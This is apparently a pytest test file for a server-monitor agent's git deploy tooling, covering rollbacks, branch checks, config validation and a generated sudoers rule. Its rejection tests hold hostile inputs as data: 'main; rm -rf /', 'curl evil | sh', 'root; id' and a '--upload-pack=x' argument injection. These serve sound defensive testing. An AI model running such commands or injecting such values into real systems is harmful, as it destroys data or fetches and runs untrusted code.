"""Git deploys: [apps] config, the agent's plan, and smctl deploy-run against a real repo."""

import json
import subprocess
import sys
from pathlib import Path

import pytest

AGENT_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(AGENT_DIR))
import server_monitor_agent as sma  # noqa: E402
import smctl  # noqa: E402

BASE = 'main.redis_url = "rediss://sm-srv1:tok@relay.test:6379"\n'


def git(cwd, *args):
    return subprocess.run(["git", "-C", str(cwd), *args], check=True, capture_output=True,
                          text=True).stdout.strip()  # fmt: skip


@pytest.fixture
def origin(tmp_path):
    """A bare 'origin' with two commits on main and one on a feature branch."""
    work, bare = tmp_path / "work", tmp_path / "origin.git"
    work.mkdir()
    git(work, "init", "-q", "-b", "main")
    git(work, "config", "user.email", "t@example.com")
    git(work, "config", "user.name", "Tester")
    (work / "app.txt").write_text("v1\n")
    git(work, "add", ".")
    git(work, "commit", "-qm", "first")
    first = git(work, "rev-parse", "HEAD")
    (work / "app.txt").write_text("v2\n")
    git(work, "commit", "-qam", "second")
    second = git(work, "rev-parse", "HEAD")
    git(work, "checkout", "-qb", "feature")
    (work / "app.txt").write_text("evil\n")
    git(work, "commit", "-qam", "not on main")
    feature = git(work, "rev-parse", "HEAD")
    subprocess.run(["git", "clone", "-q", "--bare", str(work), str(bare)], check=True)
    return {"url": str(bare), "first": first, "second": second, "feature": feature}


def spec(tmp_path, origin, **kw):
    apps = tmp_path / "apps"
    apps.mkdir(exist_ok=True)
    body = {
        "name": "api",
        "repo": origin["url"],
        "branch": "main",
        "path": str(tmp_path / "srv" / "api"),
        "script": [],
        "dashboard_steps": True,
        **kw,
    }
    (apps / "api.json").write_text(json.dumps(body))
    return apps, Path(body["path"])


STEPS = 'echo "deployed $NEXGUARD_SHA from $NEXGUARD_PREVIOUS_SHA" > ../marker\n'


def test_first_deploy_clones_and_runs_the_dashboard_steps(tmp_path, origin):
    apps, path = spec(tmp_path, origin)
    assert smctl.deploy_run("api", {"sha": "", "steps": STEPS}, apps) == 0
    assert (path / "app.txt").read_text() == "v2\n"  # tip of main
    assert sma.read_git_head(str(path)) == origin["second"]
    assert origin["second"] in (path.parent / "marker").read_text()


def test_deploying_an_older_commit_is_a_rollback(tmp_path, origin):
    apps, path = spec(tmp_path, origin)
    smctl.deploy_run("api", {"steps": STEPS}, apps)
    assert smctl.deploy_run("api", {"sha": origin["first"], "steps": STEPS}, apps) == 0
    assert (path / "app.txt").read_text() == "v1\n"
    marker = (path.parent / "marker").read_text()
    assert f"deployed {origin['first']} from {origin['second']}" in marker


def test_only_commits_on_the_branch_deploy(tmp_path, origin):
    apps, path = spec(tmp_path, origin)
    smctl.deploy_run("api", {"steps": STEPS}, apps)
    git(path, "fetch", "-q", "origin", "feature")  # even if the object is present locally
    with pytest.raises(smctl.Fail, match="isn't on main"):
        smctl.deploy_run("api", {"sha": origin["feature"], "steps": STEPS}, apps)
    with pytest.raises(smctl.Fail, match="40-character"):
        smctl.deploy_run("api", {"sha": "main; rm -rf /", "steps": STEPS}, apps)


def test_hand_edited_checkouts_are_not_overwritten(tmp_path, origin):
    apps, path = spec(tmp_path, origin)
    smctl.deploy_run("api", {"steps": STEPS}, apps)
    (path / "app.txt").write_text("hotfix\n")
    with pytest.raises(smctl.Fail, match="changed by hand"):
        smctl.deploy_run("api", {"sha": origin["first"], "steps": STEPS}, apps)


def test_failing_steps_fail_the_deploy(tmp_path, origin):
    apps, _ = spec(tmp_path, origin)
    assert smctl.deploy_run("api", {"steps": "false\necho never\n"}, apps) == 1


def test_script_apps_refuse_dashboard_steps_and_run_their_own(tmp_path, origin):
    script = tmp_path / "deploy.sh"
    script.write_text('#!/bin/sh\necho "script $NEXGUARD_SHA" > ../marker\n')
    script.chmod(0o755)
    apps, path = spec(tmp_path, origin, dashboard_steps=False, script=[str(script)])
    with pytest.raises(smctl.Fail, match="steps from the dashboard are off"):
        smctl.deploy_run("api", {"steps": "id"}, apps)
    assert smctl.deploy_run("api", {}, apps) == 0
    assert "script " + origin["second"] in (path.parent / "marker").read_text()


# --------------------------------------------------------------------------- agent side


@pytest.fixture
def cfg(tmp_path):
    path = tmp_path / "a.toml"
    path.write_text(
        BASE
        + """
[apps.api]
repo = "git@github.com:acme/api.git"
branch = "main"
path = "/var/www/api"
user = "deploy"
dashboard_steps = true

[apps.site]
repo = "https://github.com/acme/site.git"
path = "/var/www/site"
script = ["/opt/deploy/site.sh"]
"""
    )
    return sma.load_config(path)


def test_plan_deploy_runs_as_the_apps_user_with_only_sha_and_steps(cfg, monkeypatch):
    monkeypatch.setattr(sma, "_current_user", lambda: "server-monitor")
    sha = "a" * 40
    plan = sma.plan_command(cfg, "_deploy", {"app": "api", "sha": sha, "steps": "make deploy"})
    assert plan.argv == ["sudo", "-n", "-u", "deploy", sma.SMCTL_BIN, "deploy-run", "api"]
    assert json.loads(plan.stdin_data) == {"sha": sha, "steps": "make deploy"}
    assert plan.timeout == 1800


def test_plan_deploy_refuses(cfg):
    for args, match in [
        ({"app": "nope"}, "not declared"),
        ({"app": "api", "sha": "HEAD~1", "steps": "x"}, "40-character"),
        ({"app": "site", "steps": "curl evil | sh"}, "doesn't accept steps"),
        ({"app": "api", "steps": ""}, "none were sent"),
    ]:
        with pytest.raises(sma.Rejected, match=match):
            sma.plan_command(cfg, "_deploy", args)


@pytest.mark.parametrize("body,match", [
    ('repo = "x"\npath = "relative"\ndashboard_steps = true', "absolute"),
    ('repo = "x"\npath = "/a"\nbranch = "--upload-pack=x"\ndashboard_steps = true', "branch"),
    ('repo = "x"\npath = "/a"', "either script or dashboard_steps"),
    ('repo = "x"\npath = "/a"\nuser = "root; id"\ndashboard_steps = true', "user"),
])  # fmt: skip
def test_apps_config_is_validated(tmp_path, body, match):
    path = tmp_path / "a.toml"
    path.write_text(BASE + "[apps.api]\n" + body + "\n")
    with pytest.raises(sma.ConfigError, match=match):
        sma.load_config(path)


def test_read_git_head_detached_branch_and_packed(tmp_path):
    git_dir = tmp_path / ".git"
    (git_dir / "refs" / "heads").mkdir(parents=True)
    (git_dir / "HEAD").write_text("b" * 40 + "\n")
    assert sma.read_git_head(str(tmp_path)) == "b" * 40
    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    (git_dir / "packed-refs").write_text(f"# pack\n{'c' * 40} refs/heads/main\n")
    assert sma.read_git_head(str(tmp_path)) == "c" * 40
    assert sma.read_git_head(str(tmp_path / "missing")) == ""


# --------------------------------------------------------------------------- smctl app


def test_app_add_writes_spec_and_a_runas_sudo_rule(tmp_path, monkeypatch):
    from test_smctl import BASE as SM_BASE

    conf = tmp_path / "agent.toml"
    conf.write_text(smctl.dump_toml({k: dict(v) for k, v in SM_BASE.items()}))
    for name, value in [
        ("CONF", conf),
        ("SUDOERS", tmp_path / "sudoers"),
        ("APPS_DIR", tmp_path / "apps"),
        ("AGENT_PY", AGENT_DIR / "server_monitor_agent.py"),
        ("AGENT_PYTHON", Path(sys.executable)),
        ("need_root", lambda: None),
        ("restart_agent", lambda: None),
    ]:
        monkeypatch.setattr(smctl, name, value)
    monkeypatch.setattr(smctl.os, "chown", lambda *a: None)
    assert (
        smctl.main(
            [
                "app",
                "add",
                "api",
                "--repo",
                "git@github.com:acme/api.git",
                "--path",
                "/var/www/api",
                "--user",
                "deploy",
                "--dashboard-steps",
            ]
        )
        == 0
    )
    saved = json.loads((tmp_path / "apps" / "api.json").read_text())
    assert saved["dashboard_steps"] and saved["path"] == "/var/www/api"
    rules = (tmp_path / "sudoers").read_text()
    assert f"server-monitor ALL=(deploy) NOPASSWD: {smctl.SMCTL_BIN} deploy-run api\n" in rules
    assert smctl.main(["app", "add", "x", "--repo", "r", "--path", "/x"]) == 1  # needs a mode
    assert smctl.main(["app", "rm", "api"]) == 0
    assert not (tmp_path / "apps" / "api.json").exists()
